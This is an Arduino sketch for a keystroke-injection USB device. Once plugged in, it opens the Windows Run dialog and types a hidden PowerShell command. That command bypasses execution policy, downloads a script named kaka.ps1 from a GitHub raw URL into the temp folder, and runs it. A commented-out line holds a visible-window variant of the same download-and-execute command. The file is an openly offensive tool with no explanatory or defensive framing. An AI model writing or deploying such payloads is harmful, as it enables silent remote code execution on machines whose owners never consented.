#include <Keyboard.h>

void setup() {
Keyboard.begin();
delay(1000);

Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('d');
Keyboard.releaseAll();
delay(150);

Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();
delay(100);

/// OK 1
///print(F("powershell -NoProfile -ExecutionPolicy Bypass -Command \"$p=\\\"$env:TEMP\\kaka.ps1\\\"; Invoke-RestMethod 'https://raw.githubusercontent.com/hnahkcad/sample/refs/heads/main/kaka.ps1' -OutFile $p; & $p\""));
/// OK 2
print(F("cmd /c start \"\" /min powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$p=\\\"$env:TEMP\\kaka.ps1\\\"; Invoke-RestMethod 'https://raw.githubusercontent.com/hnahkcad/sample/refs/heads/main/kaka.ps1' -OutFile $p; & $p\""));
delay(300);

type(KEY_RETURN,false);
Keyboard.releaseAll();
delay(750);

Keyboard.end();
}
void type(int key, boolean release) {
  Keyboard.press(key);
  if(release)
    Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
  Keyboard.print(value);
}
void loop(){}